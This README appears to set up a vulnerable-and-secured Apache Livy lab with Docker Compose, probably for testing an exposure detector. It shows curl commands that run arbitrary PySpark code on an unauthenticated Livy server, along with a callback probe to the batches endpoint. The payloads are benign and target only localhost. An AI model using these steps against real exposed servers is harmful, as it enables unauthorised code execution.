# Setup Apache Livy with Docker Compose

## Vulnerable (Exposed UI — no authentication)
```bash
docker compose build spark-master
docker compose up
```

### Access the Livy UI and execute PySpark code
```bash
curl -X POST -H "Content-Type: application/json" -d '{"kind":"pyspark"}' http://localhost:8998/sessions
# {"id":6,"name":null,"appId":null,"owner":null,"proxyUser":null,"state":"starting",...}

# replace id from last response with $id
curl -X POST -H "Content-Type: application/json" -d '{"code":"import os\nprint(os.getcwd())"}' http://localhost:8998/sessions/$id/statements
# wait ~30sec for session to become idle

# replace id from last response with $statements_id
curl http://127.0.0.1:8998/sessions/$id/statements/$statements_id
# output.data is the stdout
```
#### alternative approach
instead, you can send the callback address to `batches` endpoint to check if the Apache Hive instance is exposed
```bash
curl -X POST -H "Content-Type: application/json" -d '{"file":"callback_address"}' http://localhost:8998/batches
```

---

## Secured (Custom Authentication Filter)

```bash
# Build and start the secured stack
docker compose -f docker-compose-secure.yml build
docker compose -f docker-compose-secure.yml up
```

### Test authentication
```bash
# Without token → 401
curl -X POST -H "Content-Type: application/json" -d '{"kind":"pyspark"}' http://localhost:8998/sessions

# With valid token → 200
curl -X POST -H "Authorization: Bearer changeme-use-a-strong-secret" -H "Content-Type: application/json" -d '{"kind":"pyspark"}' http://localhost:8998/sessions

```
